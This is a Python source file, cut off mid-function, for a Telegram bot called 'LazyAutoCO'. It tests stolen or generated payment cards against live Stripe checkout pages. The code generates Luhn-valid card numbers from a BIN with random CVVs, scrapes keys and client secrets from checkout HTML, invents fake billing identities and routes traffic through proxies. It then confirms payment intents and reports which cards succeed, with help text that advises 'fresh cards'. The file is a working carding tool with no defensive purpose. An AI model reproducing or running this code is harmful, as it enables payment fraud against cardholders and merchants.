import asyncio
import aiohttp
import logging
import re
import json
import time
import random
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Tuple, Any
from dataclasses import dataclass, asdict
from urllib.parse import urlparse, parse_qs, urlencode
import base64

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
    ConversationHandler,
)
import nest_asyncio
nest_asyncio.apply()

# ============= CONFIGURATION =============
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_IDS = [123456789]  # Your Telegram user ID

# ============= LOGGING =============
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============= CONVERSATION STATES =============
(WAITING_EMAIL, WAITING_PROXY, WAITING_URL, WAITING_CARDS, WAITING_BIN) = range(5)

# ============= DATA CLASSES =============
@dataclass
class Card:
    number: str
    month: str
    year: str
    cvv: str
    
    @classmethod
    def from_string(cls, card_str: str) -> Optional['Card']:
        """Parse card from string format"""
        card_str = card_str.strip()
        
        # Handle different separators
        if '|' in card_str:
            parts = card_str.split('|')
        else:
            parts = card_str.split()
        
        if len(parts) >= 4:
            number = re.sub(r'\D', '', parts[0])
            month = re.sub(r'\D', '', parts[1]).zfill(2)
            year = re.sub(r'\D', '', parts[2]).zfill(2)
            cvv = re.sub(r'\D', '', parts[3])
            
            if len(number) >= 13 and len(number) <= 19:
                if 1 <= int(month) <= 12:
                    if len(year) in [2, 4]:
                        if len(cvv) in [3, 4]:
                            return cls(
                                number=number,
                                month=month,
                                year=year[-2:] if len(year) == 4 else year,
                                cvv=cvv
                            )
        return None
    
    @classmethod
    def generate_from_bin(cls, bin_str: str, count: int = 1) -> List['Card']:
        """Generate valid Luhn cards from BIN"""
        bin_clean = re.sub(r'\D', '', bin_str)[:6]
        if len(bin_clean) < 6:
            return []
        
        cards = []
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        def luhn_checksum(card_number: str) -> int:
            """Calculate Luhn check digit"""
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d * 2))
            return checksum % 10
        
        def is_amex(bin_prefix: str) -> bool:
            """Check if BIN is Amex"""
            return bin_prefix[:2] in ['34', '37']
        
        for i in range(min(count, 10)):
            # Generate random 9 digits
            remaining = ''.join(str(random.randint(0, 9)) for _ in range(9))
            number_without_check = bin_clean + remaining
            
            # Calculate check digit
            check = luhn_checksum(number_without_check)
            number = number_without_check + str((10 - check) % 10)
            
            # Generate expiry (1-4 years ahead)
            year_offset = random.randint(1, 4)
            year = (current_year + year_offset) % 100
            month = random.randint(1, 12)
            
            # Ensure month is not in past for current year
            if year_offset == 0 and month < current_month:
                month = random.randint(current_month, 12)
            
            # Generate CVV based on card type
            cvv_length = 4 if is_amex(bin_clean) else 3
            cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_length))
            
            cards.append(cls(
                number=number,
                month=str(month).zfill(2),
                year=str(year).zfill(2),
                cvv=cvv
            ))
        
        return cards
    
    @property
    def full(self) -> str:
        return f"{self.number}|{self.month}|{self.year}|{self.cvv}"
    
    @property
    def masked(self) -> str:
        return f"{self.number[:6]}xxxxxx{self.number[-4:]}"

@dataclass
class Address:
    name: str
    line1: str
    line2: str = ""
    city: str = ""
    state: str = ""
    postal_code: str = ""
    country: str = "US"
    
    @classmethod
    def generate_random(cls) -> 'Address':
        """Generate random US address"""
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        
        streets = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine Rd", "Washington Ave", "Park St", "Lake Dr", "Hill St", "River Rd"]
        cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
        states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
        zips = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
        
        idx = random.randint(0, 9)
        
        return cls(
            name=f"{random.choice(first_names)} {random.choice(last_names)}",
            line1=f"{random.randint(100, 9999)} {random.choice(streets)}",
            city=cities[idx],
            state=states[idx],
            postal_code=zips[idx],
            country="US"
        )
    
    def to_dict(self) -> Dict:
        return {
            "name": self.name,
            "address_line1": self.line1,
            "address_line2": self.line2,
            "address_city": self.city,
            "address_state": self.state,
            "address_zip": self.postal_code,
            "address_country": self.country
        }

@dataclass
class Proxy:
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None
    type: str = "http"
    
    @classmethod
    def from_string(cls, proxy_str: str) -> Optional['Proxy']:
        """Parse proxy from various formats"""
        proxy_str = proxy_str.strip()
        
        # Format 1: host:port:user:pass
        if proxy_str.count(':') >= 3:
            parts = proxy_str.split(':')
            if len(parts) >= 4:
                # Check if first part is host (contains dots or digits)
                if '.' in parts[0] or parts[0].replace('.', '').isdigit():
                    return cls(
                        host=parts[0],
                        port=int(parts[1]),
                        username=parts[2],
                        password=':'.join(parts[3:])
                    )
                else:
                    # Format: user:pass:host:port
                    return cls(
                        host=parts[-2],
                        port=int(parts[-1]),
                        username=parts[0],
                        password=':'.join(parts[1:-2])
                    )
        
        # Format 2: user:pass@host:port
        elif '@' in proxy_str:
            auth_part, host_part = proxy_str.rsplit('@', 1)
            if ':' in auth_part and ':' in host_part:
                username, password = auth_part.split(':', 1)
                host, port = host_part.split(':', 1)
                return cls(
                    host=host,
                    port=int(port),
                    username=username,
                    password=password
                )
        
        # Format 3: host:port
        elif proxy_str.count(':') == 1:
            host, port = proxy_str.split(':')
            return cls(host=host, port=int(port))
        
        return None
    
    @property
    def url(self) -> str:
        if self.username and self.password:
            return f"{self.type}://{self.username}:{self.password}@{self.host}:{self.port}"
        return f"{self.type}://{self.host}:{self.port}"
    
    @property
    def auth_header(self) -> Optional[str]:
        if self.username and self.password:
            auth_str = f"{self.username}:{self.password}"
            return f"Basic {base64.b64encode(auth_str.encode()).decode()}"
        return None

@dataclass
class CheckoutInfo:
    url: str
    session_id: Optional[str] = None
    publishable_key: Optional[str] = None
    client_secret: Optional[str] = None
    payment_intent_id: Optional[str] = None
    amount: Optional[int] = None
    currency: str = "usd"
    merchant: str = ""
    product: str = ""
    email: Optional[str] = None
    country: str = "US"
    
    @property
    def amount_formatted(self) -> str:
        if self.amount:
            symbols = {
                "usd": "$", "eur": "€", "gbp": "£", "jpy": "¥",
                "cad": "C$", "aud": "A$", "inr": "₹", "krw": "₩"
            }
            symbol = symbols.get(self.currency.lower(), self.currency.upper())
            return f"{symbol}{(self.amount / 100):.2f}"
        return "Unknown"
    
    @property
    def domain(self) -> str:
        try:
            parsed = urlparse(self.url)
            return parsed.netloc.replace('www.', '')
        except:
            return "unknown.com"

@dataclass
class HitResult:
    card: Card
    status: str  # 'success', 'decline', 'error'
    message: str
    response_code: Optional[str] = None
    payment_intent_id: Optional[str] = None

# ============= PROXY MANAGER =============
class ProxyManager:
    def __init__(self):
        self.proxies: Dict[int, Proxy] = {}  # user_id -> proxy
        self.proxy_sessions: Dict[int, aiohttp.ClientSession] = {}
    
    def set_proxy(self, user_id: int, proxy_str: str) -> Tuple[bool, str]:
        """Set proxy for user"""
        proxy = Proxy.from_string(proxy_str)
        if not proxy:
            return False, "Invalid proxy format"
        
        self.proxies[user_id] = proxy
        return True, f"Proxy set: {proxy.host}:{proxy.port}"
    
    def get_proxy(self, user_id: int) -> Optional[Proxy]:
        return self.proxies.get(user_id)
    
    def clear_proxy(self, user_id: int):
        if user_id in self.proxies:
            del self.proxies[user_id]
        if user_id in self.proxy_sessions:
            asyncio.create_task(self.proxy_sessions[user_id].close())
            del self.proxy_sessions[user_id]
    
    async def get_session(self, user_id: int) -> aiohttp.ClientSession:
        """Get or create aiohttp session with proxy"""
        if user_id in self.proxy_sessions:
            return self.proxy_sessions[user_id]
        
        proxy = self.proxies.get(user_id)
        if proxy:
            connector = aiohttp.TCPConnector(ssl=False)
            session = aiohttp.ClientSession(
                connector=connector,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "application/json",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Origin": "https://checkout.stripe.com",
                }
            )
            self.proxy_sessions[user_id] = session
            return session
        else:
            return aiohttp.ClientSession()
    
    async def test_proxy(self, proxy_str: str) -> Tuple[bool, Dict]:
        """Test if proxy is working"""
        proxy = Proxy.from_string(proxy_str)
        if not proxy:
            return False, {"error": "Invalid format"}
        
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                start = time.time()
                async with session.get(
                    "http://ip-api.com/json/",
                    proxy=proxy.url,
                    timeout=10
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        response_time = int((time.time() - start) * 1000)
                        return True, {
                            "ip": data.get("query"),
                            "country": data.get("country"),
                            "city": data.get("city"),
                            "isp": data.get("isp"),
                            "response_time": response_time
                        }
                    return False, {"error": f"HTTP {resp.status}"}
        except Exception as e:
            return False, {"error": str(e)}
    
    async def close_all(self):
        for session in self.proxy_sessions.values():
            await session.close()

# ============= STRIPE API HANDLER =============
class StripeAPI:
    def __init__(self, proxy_manager: ProxyManager):
        self.proxy_manager = proxy_manager
        self.stripe_api_url = "https://api.stripe.com"
    
    async def extract_checkout_info(self, url: str, user_id: int) -> Optional[CheckoutInfo]:
        """Extract checkout information from Stripe URL"""
        session = await self.proxy_manager.get_session(user_id)
        
        try:
            async with session.get(url, allow_redirects=True, timeout=15) as resp:
                if resp.status != 200:
                    return None
                
                html = await resp.text()
                final_url = str(resp.url)
                
                info = CheckoutInfo(url=final_url)
                
                # Extract session ID (cs_live or cs_test)
                session_patterns = [
                    r'["\']?([cs]_(?:test|live)_[a-zA-Z0-9]{,64})["\']?',
                    r'/c/pay/(cs_live_[a-zA-Z0-9]+)',
                    r'/c/pay/(cs_test_[a-zA-Z0-9]+)',
                    r'checkout\.stripe\.com/(?:c/)?pay/(cs_live_[a-zA-Z0-9]+)',
                    r'checkout\.stripe\.com/(?:c/)?pay/(cs_test_[a-zA-Z0-9]+)',
                    r'buy\.stripe\.com/(?:[^/]+/)?(cs_live_[a-zA-Z0-9]+)',
                ]
                
                for pattern in session_patterns:
                    match = re.search(pattern, final_url) or re.search(pattern, url) or re.search(pattern, html)
                    if match:
                        info.session_id = match.group(1)
                        break
                
                # Extract publishable key
                key_patterns = [
                    r'pk_live_[a-zA-Z0-9]+',
                    r'pk_test_[a-zA-Z0-9]+',
                    r'"publishableKey"\s*:\s*"(pk_live_[a-zA-Z0-9]+)"',
                    r'"publishableKey"\s*:\s*"(pk_test_[a-zA-Z0-9]+)"',
                    r'data-stripe-publishable-key="(pk_live_[a-zA-Z0-9]+)"',
                    r'key=([a-zA-Z0-9_]+)',
                ]
                
                for pattern in key_patterns:
                    match = re.search(pattern, html)
                    if match:
                        info.publishable_key = match.group(1) if '(' in pattern and match.groups() else match.group(0)
                        break
                
                # Extract client secret
                secret_match = re.search(r'"client_secret":\s*"([^"]+)"', html)
                if secret_match:
                    info.client_secret = secret_match.group(1)
                    # Extract payment intent ID from client secret
                    if '_secret_' in info.client_secret:
                        info.payment_intent_id = info.client_secret.split('_secret_')[0]
                
                # Extract amount
                amount_patterns = [
                    r'"amount":\s*(\d+)',
                    r'"amount_total":\s*(\d+)',
                    r'"amount_due":\s*(\d+)',
                    r'data-amount="(\d+)"',
                    r'<span class="[^"]*amount[^"]*"[^>]*>\$?(\d+\.?\d*)',
                ]
                
                for pattern in amount_patterns:
                    match = re.search(pattern, html)
                    if match:
                        try:
                            amount_str = match.group(1)
                            if '.' in amount_str:
                                info.amount = int(float(amount_str) * 100)
                            else:
                                info.amount = int(amount_str)
                            break
                        except:
                            pass
                
                # Extract currency
                currency_match = re.search(r'"currency":\s*"([a-z]{3})"', html)
                if currency_match:
                    info.currency = currency_match.group(1)
                
                # Extract merchant name
                merchant_patterns = [
                    r'"business_name":\s*"([^"]+)"',
                    r'"display_name":\s*"([^"]+)"',
                    r'"merchant_name":\s*"([^"]+)"',
                    r'<title>([^<]+)(?:\s*[|–-]\s*.*)?</title>',
                    r'<meta property="og:site_name" content="([^"]+)"',
                ]
                
                for pattern in merchant_patterns:
                    match = re.search(pattern, html)
                    if match:
                        info.merchant = match.group(1).strip()
                        break
                
                # Extract product name
                product_patterns = [
                    r'"description":\s*"([^"]+)"',
                    r'"name":\s*"([^"]+)"',
                    r'"product_name":\s*"([^"]+)"',
                    r'<h1[^>]*>([^<]+)</h1>',
                ]
                
                for pattern in product_patterns:
                    match = re.search(pattern, html)
                    if match:
                        info.product = match.group(1).strip()
                        break
                
                # Extract email
                email_match = re.search(r'"customer_email":\s*"([^"]+)"', html) or \
                             re.search(r'[\w\.-]+@[\w\.-]+\.\w+', html)
                if email_match:
                    info.email = email_match.group(1) if hasattr(email_match, 'group') and email_match.groups() else email_match.group(0)
                
                return info
                
        except Exception as e:
            logger.error(f"Error extracting checkout: {e}")
            return None
    
    async def create_payment_method(self, card: Card, address: Address, user_id: int, publishable_key: str) -> Optional[str]:
        """Create a Stripe payment method"""
        session = await self.proxy_manager.get_session(user_id)
        
        url = f"{self.stripe_api_url}/v1/payment_methods"
        data = {
            "type": "card",
            "card[number]": card.number,
            "card[exp_month]": card.month,
            "card[exp_year]": card.year,
            "card[cvc]": card.cvv,
            "billing_details[name]": address.name,
            "billing_details[email]": address.name.replace(' ', '.').lower() + "@gmail.com",
            "billing_details[address][line1]": address.line1,
            "billing_details[address][city]": address.city,
            "billing_details[address][state]": address.state,
            "billing_details[address][postal_code]": address.postal_code,
            "billing_details[address][country]": address.country,
            "key": publishable_key
        }
        
        headers = {
            "Authorization": f"Bearer {publishable_key}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        try:
            async with session.post(url, data=data, headers=headers, timeout=15) as resp:
                result = await resp.json()
                if resp.status in [200, 201] and 'id' in result:
                    return result['id']
                else:
                    logger.error(f"PM creation failed: {result}")
                    return None
        except Exception as e:
            logger.error(f"PM creation error: {e}")
            return None
    
    async def confirm_payment_intent(self, 
                                     payment_intent_id: str, 
                                     payment_method_id: str,
                                     publishable_key: str,
                                     user_id: int) -> Tuple[bool, str, Optional[str]]:
        """Confirm a payment intent"""
        session = await self.proxy_manager.get_session(user_id)
        
        url = f"{self.stripe_api_url}/v1/payment_intents/{payment_intent_id}/confirm"
        data = {
            "payment_method": payment_method_id,
            "key": publishable_key
        }
        
        headers = {
            "Authorization": f"Bearer {publishable_key}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        try:
            async with session.post(url, data=data, headers=headers, timeout=15) as resp:
                result = await resp.json()
                
                if resp.status in [200, 201]:
                    if result.get('status') == 'succeeded':
                        return True, "success", result.get('id')
                    elif result.get('status') == 'requires_action':
                        return False, "requires_3ds", None
                    elif result.get('status') == 'requires_payment_method':
                        return False, "requires_new_card", None
                    else:
                        return False, f"status: {result.get('status')}", None
                
                # Check for decline codes
                error = result.get('error', {})
                decline_code = error.get('decline_code', '')
                message = error.get('message', 'unknown_error')
                
                if decline_code:
                    return False, decline_code, None
                else:
                    return False, message, None
                    
        except Exception as e:
            logger.error(f"Confirm error: {e}")
            return False, "request_error", None
    
    async def retrieve_payment_intent(self, payment_intent_id: str, publishable_key: str, user_id: int) -> Optional[Dict]:
        """Retrieve payment intent details"""
        session = await self.proxy_manager.get_session(user_id)
        
        url = f"{self.stripe_api_url}/v1/payment_intents/{payment_intent_id}"
        params = {
            "key": publishable_key
        }
        
        headers = {
            "Authorization": f"Bearer {publishable_key}"
        }
        
        try:
            async with session.get(url, params=params, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
        except Exception as e:
            logger.error(f"Retrieve error: {e}")
            return None

# ============= BOT CLASS =============
class CheckoutBot:
    def __init__(self, token: str):
        self.token = token
        self.app = Application.builder().token(token).build()
        
        self.proxy_manager = ProxyManager()
        self.stripe_api = StripeAPI(self.proxy_manager)
        
        self.user_data: Dict[int, Dict] = {}  # user_id -> {email, address, etc}
        
        # Register handlers
        self.setup_handlers()
    
    def setup_handlers(self):
        """Setup all command handlers"""
        # Basic commands
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("help", self.help_command))
        self.app.add_handler(CommandHandler("setup", self.setup_command))
        self.app.add_handler(CommandHandler("proxy", self.proxy_command))
        self.app.add_handler(CommandHandler("testproxy", self.testproxy_command))
        self.app.add_handler(CommandHandler("clearproxy", self.clearproxy_command))
        self.app.add_handler(CommandHandler("co", self.checkout_command))
        self.app.add_handler(CommandHandler("cb", self.checkout_bin_command))
        self.app.add_handler(CommandHandler("status", self.status_command))
        self.app.add_handler(CommandHandler("cancel", self.cancel_command))
        
        # Message handlers for conversation
        self.app.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, 
            self.handle_text
        ))
        
        # Callback handler
        self.app.add_handler(CallbackQueryHandler(self.button_callback))
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        welcome = """
╔════════════════════════════╗
║     🤖 *LazyAutoCO*        ║
╚════════════════════════════╝

*Setup First:*
• `/setup` - Configure your email
• `/proxy` - Set up proxy (optional)
• `/testproxy` - Test current proxy

*Commands:*
• `/co <url>` - Test cards against checkout
• `/cb <url> <bin> [count]` - Generate cards from BIN
• `/status` - View your current setup
• `/help` - Detailed help
• `/cancel` - Cancel current operation

*Proxy Formats Supported:*
• `host:port`
• `host:port:user:pass`
• `user:pass@host:port`
• `user:pass:host:port`

*Real Stripe Integration*
*No Simulations*
"""
        await update.message.reply_text(welcome, parse_mode='Markdown')
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        help_text = """
*Detailed Help*

*Card Format:*
• `4111111111111111|12|25|123` (pipe separated)
• `4111111111111111 12 25 123` (space separated)

*BIN Generation:*
• `/cb https://url.com 424242 5`
• Generates 5 valid Luhn cards with BIN 424242

*Address Generation:*
• Random US addresses auto-generated
• Includes name, street, city, state, zip

*Stripe Decline Codes:*
• `insufficient_funds` - Card has insufficient funds
• `card_declined` - Generic decline
• `incorrect_cvc` - Wrong security code
• `expired_card` - Card expired
• `processing_error` - Temporary error
• `do_not_honor` - Bank declined
• `fraudulent` - Flagged as fraud
• `lost_card` - Card reported lost
• `stolen_card` - Card reported stolen
• `pickup_card` - Bank wants card back

*Tips:*
• Always test proxy first with /testproxy
• Max 10 cards per session
• Use fresh cards for better results
"""
        await update.message.reply_text(help_text, parse_mode='Markdown')
    
    async def setup_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /setup command"""
        user_id = update.effective_user.id
        
        context.user_data['state'] = WAITING_EMAIL
        
        await update.message.reply_text(
            "📧 *Setup*\n\n"
            "Please enter your default email address:\n"
            "`example@email.com`",
            parse_mode='Markdown'
        )
    
    async def proxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /proxy command"""
        if context.args:
            # Direct proxy input
            proxy_str = ' '.join(context.args)
            success, message = self.proxy_manager.set_proxy(
                update.effective_user.id, 
                proxy_str
            )
            
            if success:
                await update.message.reply_text(f"✅ {message}")
            else:
                await update.message.reply_text(f"❌ {message}")
        else:
            # Ask for proxy
            context.user_data['state'] = WAITING_PROXY
            await update.message.reply_text(
                "🌐 *Set Proxy*\n\n"
                "Send your proxy in one of these formats:\n"
                "• `host:port`\n"
                "• `host:port:user:pass`\n"
                "• `user:pass@host:port`\n"
                "• `user:pass:host:port`\n\n"
                "Example: `192.168.1.1:8080:admin:password`",
                parse_mode='Markdown'
            )
    
    async def testproxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /testproxy command"""
        user_id = update.effective_user.id
        proxy = self.proxy_manager.get_proxy(user_id)
        
        if not proxy:
            await update.message.reply_text("❌ No proxy set. Use /proxy first")
            return
        
        status_msg = await update.message.reply_text("🔄 Testing proxy...")
        
        success, info = await self.proxy_manager.test_proxy(
            f"{proxy.host}:{proxy.port}:{proxy.username or ''}:{proxy.password or ''}"
        )
        
        if success:
            result = f"""
✅ *Proxy Working*

*IP:* `{info.get('ip', 'N/A')}`
*Location:* {info.get('country', 'N/A')}, {info.get('city', 'N/A')}
*ISP:* {info.get('isp', 'N/A')}
*Response Time:* {info.get('response_time', 'N/A')}ms
*Proxy:* `{proxy.host}:{proxy.port}`
"""
            await status_msg.edit_text(result, parse_mode='Markdown')
        else:
            await status_msg.edit_text(f"❌ Proxy failed: {info.get('error', 'Unknown error')}")
    
    async def clearproxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /clearproxy command"""
        user_id = update.effective_user.id
        self.proxy_manager.clear_proxy(user_id)
        await update.message.reply_text("🗑️ Proxy cleared")
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /status command"""
        user_id = update.effective_user.id
        user_data = self.user_data.get(user_id, {})
        proxy = self.proxy_manager.get_proxy(user_id)
        
        status = f"""
*Your Configuration*

*Email:* `{user_data.get('email', 'Not set')}`
*Proxy:* {f'`{proxy.host}:{proxy.port}`' if proxy else 'Not set'}

Use /setup to configure email
Use /proxy to set up proxy
"""
        await update.message.reply_text(status, parse_mode='Markdown')
    
    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /cancel command"""
        context.user_data.clear()
        await update.message.reply_text("❌ Operation cancelled")
    
    async def checkout_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /co command"""
        user_id = update.effective_user.id
        
        # Check if email is set
        if user_id not in self.user_data or 'email' not in self.user_data[user_id]:
            await update.message.reply_text(
                "❌ Please set up your email first with /setup"
            )
            return
        
        if not context.args:
            await update.message.reply_text(
                "Usage: `/co <stripe_checkout_url>`\n"
                "Example: `/co https://buy.stripe.com/test_123`",
                parse_mode='Markdown'
            )
            return
        
        url = context.args[0]
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # Store URL and wait for cards
        context.user_data['url'] = url
        context.user_data['state'] = WAITING_CARDS
        
        # Try to extract checkout info immediately
        info_msg = await update.message.reply_text("🔄 Fetching checkout info...")
        checkout_info = await self.stripe_api.extract_checkout_info(url, user_id)
        
        if checkout_info:
            info_text = f"""
✅ *Checkout Detected*

*Merchant:* {checkout_info.merchant or checkout_info.domain}
*Product:* {checkout_info.product or 'N/A'}
*Amount:* {checkout_info.amount_formatted}
*Session:* `{checkout_info.session_id or 'N/A'}`
*Email:* {checkout_info.email or 'Not set'}

Now send your cards (one per line, max 10):
`4111111111111111|12|25|123`
"""
            await info_msg.edit_text(info_text, parse_mode='Markdown')
            context.user_data['checkout_info'] = checkout_info
        else:
            await info_msg.edit_text(
                f"⚠️ Couldn't fetch details\n"
                f"URL: `{url}`\n\n"
                f"Send cards anyway? (one per line)",
                parse_mode='Markdown'
            )
    
    async def checkout_bin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /cb command (BIN generation)"""
        user_id = update.effective_user.id
        
        # Check if email is set
        if user_id not in self.user_data or 'email' not in self.user_data[user_id]:
            await update.message.reply_text(
                "❌ Please set up your email first with /setup"
            )
            return
        
        if len(context.args) < 2:
            await update.message.reply_text(
                "Usage: `/cb <url> <bin> [count]`\n"
                "Example: `/cb https://buy.stripe.com/... 424242 5`",
                parse_mode='Markdown'
            )
            return
        
        url = context.args[0]
        bin_str = context.args[1]
        count = 1
        
        if len(context.args) >= 3:
            try:
                count = min(int(context.args[2]), 10)
            except:
                count = 1
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        bin_clean = re.sub(r'\D', '', bin_str)
        if len(bin_clean) < 6:
            await update.message.reply_text("❌ BIN must be at least 6 digits")
            return
        
        # Generate cards immediately
        status_msg = await update.message.reply_text("🔄 Fetching checkout info and generating cards...")
        
        # Fetch checkout info
        checkout_info = await self.stripe_api.extract_checkout_info(url, user_id)
        
        if not checkout_info:
            checkout_info = CheckoutInfo(url=url)
        
        # Generate cards
        cards = Card.generate_from_bin(bin_clean, count)
        
        # Process the cards
        results = await self.process_cards_real(user_id, checkout_info, cards, status_msg)
        
        # Send results
        await self.send_formatted_results(update, context, checkout_info, results, count)
    
    async def process_cards_real(self, user_id: int, checkout_info: CheckoutInfo, cards: List[Card], status_msg=None) -> List[HitResult]:
        """Actually process cards against Stripe - NO SIMULATIONS"""
        results = []
        
        # Generate random address for billing
        address = Address.generate_random()
        
        for i, card in enumerate(cards):
            if status_msg:
                await status_msg.edit_text(f"🔄 Processing card {i+1}/{len(cards)}...")
            
            # Step 1: Create payment method
            pm_id = await self.stripe_api.create_payment_method(
                card, 
                address, 
                user_id, 
                checkout_info.publishable_key or "pk_live_YOUR_KEY_HERE"
            )
            
            if not pm_id:
                results.append(HitResult(
                    card=card,
                    status="error",
                    message="payment_method_failed"
                ))
                continue
            
            # Step 2: If we have payment intent ID, confirm it
            if checkout_info.payment_intent_id and checkout_info.publishable_key:
                success, message, pi_id = await self.stripe_api.confirm_payment_intent(
                    checkout_info.payment_intent_id,
                    pm_id,
                    checkout_info.publishable_key,
                    user_id
                )
                
                if success:
                    results.append(HitResult(
                        card=card,
                        status="success",
                        message=message,
                        payment_intent_id=pi_id
                    ))
                else:
                    results.append(HitResult(
                        card=card,
                        status="decline",
                        message=message
                    ))
            else:
                # Without payment intent ID, we can't confirm
                results.append(HitResult(
                    card=card,
                    status="error",
                    message="no_payment_intent"
                ))
            
            # Delay between cards to avoid rate limiting
            await asyncio.sleep(2)
        
        return results
    
    async def process_cards(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process the cards (callback handler)"""
        user_id = update.effective_user.id
        cards = context.user_data.get('cards', [])
        checkout_info = context.user_data.get('checkout_info')
        url = context.user_data.get('url', '')
        
        if not checkout_info:
            checkout_info = CheckoutInfo(url=url)
        
        await update.callback_query.edit_message_text(
            f"🔄 Processing {len(cards)} cards with REAL Stripe API...",
            parse_mode='Markdown'
        )
        
        # Process cards
        results = await self.process_cards_real(user_id, checkout_info, cards, None)
        
        # Send results
        await self.send_formatted_results(update, context, checkout_info, results, len(cards))
    
    async def send_formatted_results(self, update: Update, context: ContextTypes.DEFAULT_TYPE, 
                                     checkout_info: CheckoutInfo, results: List[HitResult], generated_count: int):
        """Send formatted results to user"""
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        username = update.effective_user.username or "user"
        
        # Header
        text = [
            "╔════════════════════════════╗",
            "║     🤖 *LazyAutoCO*        ║",
            "╚════════════════════════════╝",
            "",
            f"*Merchant:* {checkout_info.merchant or checkout_info.domain}",
            f"*Product:* {checkout_info.product or 'N/A'}",
            f"*Amount:* {checkout_info.amount_formatted}",
            f"*Cards:* {len(results)}" + (f" (Generated from BIN)" if generated_count > 0 else ""),
            "",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ]
        
        # Individual card results
        success_count = 0
        for i, result in enumerate(results, 1):
            status_icon = "✅" if result.status == "success" else "❌"
            text.append("")
            text.append(f"*Card #{i}:*")
            text.append(f"`{result.card.full}`")
            text.append(f"*Message:* `{result.message}`")
            
            if result.status == "success":
                success_count += 1
                if result.payment_intent_id:
                    text.append(f"*ID:* `{result.payment_intent_id}`")
            
            if i < len(results):
                text.append("")
        
        # Footer
        text.extend([
            "",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"*All cards processed*",
            f"*Success:* {success_count}/{len(results)}",
            f"*Time:* {timestamp}",
            "",
            f"*Req By:* @{username}"
        ])
        
        result_text = "\n".join(text)
        
        # Split if too long
        if len(result_text) > 4096:
            parts = [result_text[i:i+4096] for i in range(0, len(result_text), 4096)]
            for part in parts:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=part,
                    parse_mode='Markdown'
                )
        else:
            if hasattr(update, 'callback_query') and update.callback_query:
                await update.callback_query.message.reply_text(result_text, parse_mode='Markdown')
            else:
                await update.message.reply_text(result_text, parse_mode='Markdown')
        
        # Clear session data
        context.user_data.clear()
    
    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages"""
        user_id = update.effective_user.id
        text = update.message.text
        
        state = context.user_data.get('state')
        
        if state == WAITING_EMAIL:
            # Save email
            if '@' in text and '.' in text:
                if user_id not in self.user_data:
                    self.user_data[user_id] = {}
                self.user_data[user_id]['email'] = text.strip()
                
                # Generate random address
                self.user_data[user_id]['address'] = Address.generate_random()
                
                context.user_data['state'] = None
                await update.message.reply_text(
                    f"✅ Email saved: `{text.strip()}`\n\n"
                    f"Random address generated for billing\n"
                    f"You can now use /co or /cb commands",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text("❌ Invalid email format. Try again:")
        
        elif state == WAITING_PROXY:
            # Set proxy
            success, message = self.proxy_manager.set_proxy(user_id, text)
            if success:
                context.user_data['state'] = None
                await update.message.reply_text(f"✅ {message}")
            else:
                await update.message.reply_text(f"❌ {message}\n\nTry again or /cancel")
        
        elif state == WAITING_CARDS:
            # Parse cards
            url = context.user_data.get('url')
            if not url:
                await update.message.reply_text("❌ Session expired. Use /co again")
                return
            
            lines = text.strip().split('\n')
            cards = []
            invalid = []
            
            for line in lines[:10]:
                card = Card.from_string(line)
                if card:
                    cards.append(card)
